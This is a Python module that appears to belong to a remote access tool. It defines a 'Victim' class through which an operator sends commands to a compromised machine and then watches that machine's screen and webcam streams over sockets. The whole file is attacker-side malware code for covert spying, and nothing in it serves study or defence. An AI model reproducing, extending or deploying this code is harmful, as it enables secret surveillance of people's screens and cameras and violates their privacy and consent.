from time import sleep
from constants import WATCH_SCREEN_COMMAND, WATCH_WEBCAM_COMMAND
from WebCamSharing.watcher.watcher import watchWebCam
from ScreenSharing.watcher.watcher import watchScreen


class Victim:
    # Manages all the victim abilities

    commandsSocket = None
    screenShareSocket = None
    webCameraSocket = None
    IP = None

    def __init__(self, commandsSocket, screenShareSocket=None, webCameraSocket=None):
        """
        param 1: the commands channel
        param 2: the screen sharing channel
        param 3: the web camera sharing channel

        param 1, 2, 3 type: socket.socket

        read the method [_matchVictimChannel] inside the [HostWithGui] class to understand what are channels
        and how the program works
        """
        
        self.commandsSocket = commandsSocket
        self.screenShareSocket = screenShareSocket
        self.webCameraSocket = webCameraSocket

        self.IP = self.commandsSocket.getsockname()[0]

    def watchScreen(self):
        """
        Starts watching the screen sharing
        """

        self._sendCommand(WATCH_SCREEN_COMMAND)

        # Waits for the screen sharing channel to connect
        while self.screenShareSocket == None:
            sleep(0.1)

        watchScreen(self.screenShareSocket)
        self.screenShareSocket.close()
        self.screenShareSocket = None

    def watchWebCam(self):
        """
        Starts watching the web camera sharing
        """

        self._sendCommand(WATCH_WEBCAM_COMMAND)

        # Waits for the web camera sharing channel to connect
        while self.webCameraSocket == None:
            sleep(0.1)

        watchWebCam(self.webCameraSocket)
        self.webCameraSocket.close()
        self.webCameraSocket = None

    def _sendCommand(self, command):
        """
        Sends command to the victim
        
        param 1: the command to executes
        param 1 type: str
        """

        self.commandsSocket.send(command.encode())

    def isWebCamSharingRunning(self):
        """
        Is there web camera sharing running

        return type: bool
        """

        return self.webCameraSocket != None

    def isScreenSharingRunning(self):
        """
        Is there screen sharing running

        return type: bool
        """

        return self.screenShareSocket != None
